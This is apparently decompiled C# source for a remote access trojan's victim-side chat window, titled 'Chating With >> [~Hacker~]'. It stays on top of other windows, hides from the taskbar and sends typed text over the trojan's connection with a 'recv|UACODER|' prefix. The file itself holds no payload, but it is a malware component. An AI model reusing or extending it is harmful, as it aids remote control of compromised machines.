using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns2;

namespace ns1;

internal class B : Form
{
	private IContainer icontainer_0;

	private RichTextBox richTextBox_0;

	private TextBox textBox_0;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public B()
	{
		((Form)this).add_Load((EventHandler)B_Load);
		((Control)this).add_Resize((EventHandler)B_Resize);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		vmethod_1(new RichTextBox());
		vmethod_3(new TextBox());
		((Control)this).SuspendLayout();
		((TextBoxBase)vmethod_0()).set_BackColor(Color.Black);
		((TextBoxBase)vmethod_0()).set_BorderStyle((BorderStyle)1);
		((Control)vmethod_0()).set_Dock((DockStyle)5);
		vmethod_0().set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		vmethod_0().set_ForeColor(Color.LimeGreen);
		RichTextBox obj = vmethod_0();
		Point location = new Point(0, 0);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Recv");
		((TextBoxBase)vmethod_0()).set_ReadOnly(true);
		RichTextBox obj2 = vmethod_0();
		Size size = new Size(392, 188);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(15);
		vmethod_0().set_Text("");
		vmethod_2().set_AcceptsReturn(true);
		((TextBoxBase)vmethod_2()).set_AcceptsTab(true);
		((TextBoxBase)vmethod_2()).set_BackColor(Color.Black);
		((TextBoxBase)vmethod_2()).set_BorderStyle((BorderStyle)1);
		((Control)vmethod_2()).set_Dock((DockStyle)2);
		((Control)vmethod_2()).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)vmethod_2()).set_ForeColor(Color.White);
		TextBox obj3 = vmethod_2();
		location = new Point(0, 188);
		((Control)obj3).set_Location(location);
		((TextBoxBase)vmethod_2()).set_MaxLength(999999);
		((Control)vmethod_2()).set_Name("Sendbox");
		TextBox obj4 = vmethod_2();
		size = new Size(392, 22);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(14);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(392, 210);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("B");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Chating With >> [~Hacker~]");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_0()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(RichTextBox richTextBox_1)
	{
		richTextBox_0 = richTextBox_1;
	}

	[SpecialName]
	internal virtual TextBox vmethod_2()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(TextBox textBox_1)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		KeyPressEventHandler val = new KeyPressEventHandler(method_0);
		if (textBox_0 != null)
		{
			((Control)textBox_0).remove_KeyPress(val);
		}
		textBox_0 = textBox_1;
		if (textBox_0 != null)
		{
			((Control)textBox_0).add_KeyPress(val);
		}
	}

	private void B_Load(object sender, EventArgs e)
	{
		vmethod_0().set_Text("Connected ..");
		RichTextBox val = vmethod_0();
		val.set_Text(val.get_Text() + Environment.NewLine + "-------------------------------");
	}

	private void method_0(object sender, KeyPressEventArgs e)
	{
		if (e.get_KeyChar() == '\r' && Operators.CompareString(vmethod_2().get_Text(), "", false) != 0)
		{
			RichTextBox val = vmethod_0();
			val.set_Text(val.get_Text() + Environment.NewLine + "[Me] : " + vmethod_2().get_Text());
			Class7.smethod_2().method_0().vmethod_4()
				.method_9("recv|UACODER|" + vmethod_2().get_Text());
			vmethod_2().set_Text("");
		}
	}

	private void B_Resize(object sender, EventArgs e)
	{
		((TextBoxBase)vmethod_0()).ScrollToCaret();
	}
}
